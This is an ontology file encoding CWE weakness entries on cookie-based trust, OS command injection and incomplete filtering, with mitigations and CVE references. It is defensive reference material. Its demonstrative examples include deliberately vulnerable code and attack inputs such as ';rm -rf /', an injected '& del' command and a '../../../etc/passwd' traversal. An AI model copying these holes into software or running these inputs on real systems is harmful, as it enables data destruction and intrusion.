     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Add integrity checks to detect tampering."^^xsd:string, 
                 rdfs:comment "Avoid using cookie data for a security-related decision."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Protect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following code excerpt reads a value from a browser cookie to determine the role of the user.

(bad code)
Example Language: Java 
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(\"role\")) {
userRole = c.getValue();
}
}"^^xsd:string, 
                 rdfs:comment "Example 2
The following code could be for a medical records application. It performs authentication by checking if a cookie has been set.

(bad code)
Example Language: PHP 
$auth = $_COOKIES['authenticated'];
if (! $auth) {
if (AuthenticateUser($_POST['user'], $_POST['password']) == \"success\") {

// save the cookie to send out in future responses 
setcookie(\"authenticated\", \"1\", time()+60*60*2);
}
else {
ShowLoginScreen();
die(\"\\n\");
}
}
DisplayMedicalHistory($_POST['patient_ID']);
The programmer expects that the AuthenticateUser() check will always be applied, and the \"authenticated\" cookie will only be set when authentication succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie.

However, the attacker can set the \"authenticated\" cookie to a non-zero value such as 1. As a result, the $auth variable is 1, and the AuthenticateUser() check is not even performed. The attacker has bypassed the authentication."^^xsd:string, 
                 rdfs:comment "Example 3
In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.

(bad code)
Example Language: Java 
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(\"authenticated\") && Boolean.TRUE.equals(c.getValue())) {
authenticated = true;
}
}"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Perform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 paradigms  "Web Based"^^xsd:string
    
    
Individual: CWE-78_Improper_Neutralization_of_Special_Elements_used_in_an_OS_Command

    Annotations: 
        rdfs:comment "Affected Resources:
System Process"^^xsd:string,
        rdfs:comment "Alternate Terms:
Shell injection	
Shell metacharacters"^^xsd:string,
        rdfs:comment "Functional Areas:
Program Invocation"^^xsd:string,
        rdfs:comment "Research Gap:
More investigation is needed into the distinction between the OS command injection variants, including the role with argument injection (CWE-88). Equivalent distinctions may exist in other injection-related problems such as SQL injection."^^xsd:string,
        rdfs:comment "Terminology:
The \"OS command injection\" phrase carries different meanings to different people. For some people, it only refers to cases in which the attacker injects command separators into arguments for an application-controlled program that is being invoked. For some people, it refers to any type of attack that can allow the attacker to execute OS commands of their own choosing. This usage could include untrusted search path weaknesses (CWE-426) that cause the application to find and execute an attacker-controlled program. Further complicating the issue is the case when argument injection (CWE-88) allows alternate command-line switches or options to be inserted into the command line, such as an \"-exec\" switch whose purpose may be to execute the subsequent argument as a command (this -exec switch exists in the UNIX \"find\" command, for example). In this latter case, however, CWE-88 could be regarded as the primary weakness in a chain with CWE-78."^^xsd:string,
        rdfs:comment "The software constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."^^xsd:string,
        rdfs:comment "This could allow attackers to execute unexpected, dangerous commands directly on the operating system. This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage.

There are at least two subtypes of OS command injection:

The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system(\"nslookup [HOSTNAME]\") to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.
The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use \"exec([COMMAND])\" to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.
From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Canonical example. CGI program does not neutralize \"|\" metacharacter when invoking a phonebook program."^^xsd:string
                 
                 references  CVE-1999-0067,
     
     Annotations: rdfs:comment "Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible."^^xsd:string
                 
                 references  CVE-2001-1246,
     
     Annotations: rdfs:comment "Web server allows command execution using \"|\" (pipe) character."^^xsd:string
                 
                 references  CVE-2002-0061,
     
     Annotations: rdfs:comment "Shell metacharacters in a telnet:// link are not properly handled when the launching application processes the link."^^xsd:string
                 
                 references  CVE-2002-1898,
     
     Annotations: rdfs:comment "FTP client does not filter \"|\" from filenames returned by the server, allowing for OS command injection."^^xsd:string
                 
                 references  CVE-2003-0041,
     
     Annotations: rdfs:comment "Chain: incomplete blacklist for OS command injection"^^xsd:string
                 
                 references  CVE-2007-3572,
     
     Annotations: rdfs:comment "Shell metacharacters in a filename in a ZIP archive"^^xsd:string
                 
                 references  CVE-2008-2575,
     
     Annotations: rdfs:comment "OS command injection through environment variable."^^xsd:string
                 
                 references  CVE-2008-4304,
     
     Annotations: rdfs:comment "OS command injection through https:// URLs"^^xsd:string
                 
                 references  CVE-2008-4796,
     
     Annotations: rdfs:comment "Product allows remote users to execute arbitrary commands by creating a file whose pathname contains shell metacharacters."^^xsd:string
                 
                 references  CVE-2012-1988,
     related_attack_patterns  CAPEC-108,
     
     Annotations: rdfs:comment "Command Line Execution through SQL Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-108,
     
     Annotations: rdfs:comment "Command Delimiters"^^xsd:string
                 
                 related_attack_patterns  CAPEC-15,
     
     Annotations: rdfs:comment "Exploiting Multiple Input Interpretation Layers"^^xsd:string
                 
                 related_attack_patterns  CAPEC-43,
     
     Annotations: rdfs:comment "Argument Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-6,
     
     Annotations: rdfs:comment "OS Command Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-88,
     ID  "78"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."^^xsd:string, 
                 rdfs:comment "If at all possible, use library calls rather than external processes to recreate the desired functionality."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction

For any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. For example, in web applications, this may require storing the data locally in the session's state instead of sending it out to the client in a hidden form field."^^xsd:string, 
                 rdfs:comment "Strategy: Enforcement by Conversion

When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error."^^xsd:string, 
                 rdfs:comment "Strategy: Parameterization

If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.
Some languages offer multiple functions that can be used to invoke commands. Where possible, identify any function that invokes a command shell using a single string, and replace it with a function that requires individual arguments. These functions typically perform appropriate quoting and filtering of arguments. For example, in C, the system() function accepts a string that contains the entire command to be executed, whereas execl(), execve(), and others require an array of strings, one for each argument. In Windows, CreateProcess() only accepts one command at a time. In Perl, if system() is provided with an array of arguments, then it will quote each of the arguments."^^xsd:string, 
                 rdfs:comment "Strategy: Sandbox or Jail

Run the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.
OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails.
Effectiveness: Limited

Note: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Formal Methods / Correct-By-Construction
Cost effective for partial coverage:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     availability  "DoS: Crash, Exit, or Restart"^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Hide Activities"^^xsd:string,
     availability  "Modify Application Data"^^xsd:string,
     availability  "Modify Files or Directories"^^xsd:string,
     availability  "Read Application Data"^^xsd:string,
     availability  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Attackers could execute unauthorized commands, which could then be used to disable the software, or read and modify data for which the attacker does not have permissions to access directly. Since the targeted application is directly executing the commands instead of the attacker, any malicious activities may appear to come from the application or the application's owner."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "DoS: Crash, Exit, or Restart"^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Hide Activities"^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Modify Files or Directories"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This example code intends to take the name of a user and list the contents of that user's home directory. It is subject to the first variant of OS command injection.

(bad code)
Example Language: PHP 
$userName = $_POST[\"user\"];
$command = 'ls -l /home/' . $userName;
system($command);
The $userName variable is not checked for malicious input. An attacker could set the $userName variable to an arbitrary OS command such as:

(attack code)
 
;rm -rf /
Which would result in $command being:

(result)
 
ls -l /home/;rm -rf /
Since the semi-colon is a command separator in Unix, the OS would first execute the ls command, then the rm command, deleting the entire file system.

Also note that this example code is vulnerable to Path Traversal (CWE-22) and Untrusted Search Path (CWE-426) attacks."^^xsd:string, 
                 rdfs:comment "Example 2
This example is a web application that intends to perform a DNS lookup of a user-supplied domain name. It is subject to the first variant of OS command injection.

(bad code)
Example Language: Perl 
use CGI qw(:standard);
$name = param('name');
$nslookup = \"/path/to/nslookup\";
print header;
if (open($fh, \"$nslookup $name|\")) {
while (<$fh>) {
print escapeHTML($_);
print \"<br>\\n\";
}
close($fh);
}
Suppose an attacker provides a domain name like this:

(attack code)
 
cwe.mitre.org%20%3B%20/bin/ls%20-l
The \"%3B\" sequence decodes to the \";\" character, and the %20 decodes to a space. The open() statement would then process a string like this:

(result)
 
/path/to/nslookup cwe.mitre.org ; /bin/ls -l
As a result, the attacker executes the \"/bin/ls -l\" command and gets a list of all the files in the program's working directory. The input could be replaced with much more dangerous commands, such as installing a malicious program on the server."^^xsd:string, 
                 rdfs:comment "Example 3
The example below reads the name of a shell script to execute from the system properties. It is subject to the second variant of OS command injection.

(bad code)
Example Language: Java 
String script = System.getProperty(\"SCRIPTNAME\");
if (script != null)
System.exec(script);
If an attacker has control over this property, then they could modify the property to point to a dangerous program."^^xsd:string, 
                 rdfs:comment "Example 4
In the example below, a method is used to transform geographic coordinates from latitude and longitude format to UTM format. The method gets the input coordinates from a user through a HTTP request and executes a program local to the application server that performs the transformation. The method passes the latitude and longitude coordinates as a command-line option to the external program and will perform some processing to retrieve the results of the transformation and return the resulting UTM coordinates.

(bad code)
Example Language: Java 
public String coordinateTransformLatLonToUTM(String coordinates)
{
String utmCoords = null;
try {
String latlonCoords = coordinates;
Runtime rt = Runtime.getRuntime();
Process exec = rt.exec(\"cmd.exe /C latlon2utm.exe -\" + latlonCoords);
// process results of coordinate transform

// ...
}
catch(Exception e) {...}
return utmCoords;
}
However, the method does not verify that the contents of the coordinates input parameter includes only correctly-formatted latitude and longitude coordinates. If the input coordinates were not validated prior to the call to this method, a malicious user could execute another program local to the application server by appending '&' followed by the command for another program to the end of the coordinate string. The '&' instructs the Windows operating system to execute another program."^^xsd:string, 
                 rdfs:comment "Example 5
The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.

(bad code)
Example Language: Java 
...
String btype = request.getParameter(\"backuptype\");
String cmd = new String(\"cmd.exe /K \\\"
c:\\\\util\\\\rmanDB.bat \"
+btype+
\"&&c:\\\\utl\\\\cleanup.bat\\\"\")

System.Runtime.getRuntime().exec(cmd);
...
The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form \"& del c:\\\\dbms\\\\*.*\", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
Effectiveness: Moderate"^^xsd:string, 
                 rdfs:comment "Analysis with Automated Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Web Application Scanner
Web Services Scanner
Database Scanners
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Fuzz Tester
Framework-based Fuzzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.
If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.
In the context of OS Command Injection, error information passed back to the user might reveal whether an OS command is being executed and possibly which command is being used."^^xsd:string, 
                 rdfs:comment "If the program to be executed allows arguments to be specified within an input file or from standard input, then consider using that mode to pass arguments instead of the command line."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
When constructing OS command strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.
Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like \";\" and \">\" characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components.
Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address."^^xsd:string, 
                 rdfs:comment "Strategy: Output Encoding

While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88)."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "DoS: Crash, Exit, or Restart"^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Hide Activities"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Modify Files or Directories"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     integrity  "Read Files or Directories"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     non-repudiation  "DoS: Crash, Exit, or Restart"^^xsd:string,
     non-repudiation  "Execute Unauthorized Code or Commands"^^xsd:string,
     non-repudiation  "Hide Activities"^^xsd:string,
     non-repudiation  "Modify Application Data"^^xsd:string,
     non-repudiation  "Modify Files or Directories"^^xsd:string,
     non-repudiation  "Read Application Data"^^xsd:string,
     non-repudiation  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Compilation or Build Hardening

Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's \"-T\" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184)."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's \"-T\" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184)."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."^^xsd:string, 
                 rdfs:comment "Strategy: Firewall

Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
Effectiveness: Moderate

Note: An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."^^xsd:string, 
                 rdfs:comment "Strategy: Sandbox or Jail

Run the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.
OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails.
Effectiveness: Limited

Note: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."^^xsd:string, 
                 rdfs:comment "Strategy: Sandbox or Jail

Use runtime policy enforcement to create a whitelist of allowable commands, then prevent use of any command that does not appear in the whitelist. Technologies such as AppArmor are available to do this."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.
Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.
Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke OS commands, leading to false negatives - especially if the API/library code is not available for analysis.
Note: This is not a perfect solution, since 100% accuracy and coverage are not feasible."^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Bytecode Weakness Analysis - including disassembler + source code weakness analysis
Binary Weakness Analysis - including disassembler + source code weakness analysis
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: High"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Manual Source Code Review (not inspections)
Cost effective for partial coverage:
Focused Manual Spotcheck - Focused manual analysis of source
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string
    
    
Individual: CWE-790_Improper_Filtering_of_Special_Elements

    Annotations: 
        rdfs:comment "The software receives data from an upstream component, but does not filter or incorrectly filters special elements before sending it to a downstream component."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     ID  "790"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.

(bad code)
Example Language: Perl 
my $Username = GetUntrustedInput();
$Username =~ s/\\.\\.\\///;
my $filename = \"/home/user/\" . $Username;
ReadAndSendFile($filename);
Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as:

(attack code)
 
../../../etc/passwd
will have the first \"../\" stripped, resulting in:

(result)
 
../../etc/passwd
This value is then concatenated with the /home/user/ directory:

(result)
 
/home/user/../../etc/passwd
which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-791_Incomplete_Filtering_of_Special_Elements

    Annotations: 
        rdfs:comment "The software receives data from an upstream component, but does not completely filter special elements before sending it to a downstream component."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     ID  "791"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.

(bad code)
Example Language: Perl 
my $Username = GetUntrustedInput();
$Username =~ s/\\.\\.\\///;
my $filename = \"/home/user/\" . $Username;
ReadAndSendFile($filename);
Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as:

(attack code)
 
../../../etc/passwd
will have the first \"../\" stripped, resulting in:

(result)
 
../../etc/passwd
This value is then concatenated with the /home/user/ directory:

(result)
 
/home/user/../../etc/passwd
which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-792_Incomplete_Filtering_of_One_or_More_Instances_of_Special_Elements

    Annotations: 
        rdfs:comment "Incomplete filtering of this nature involves either:

 - only filtering a single instance of a special element when more exist, or
 - not filtering all instances or all elements where multiple special elements exist."^^xsd:string,
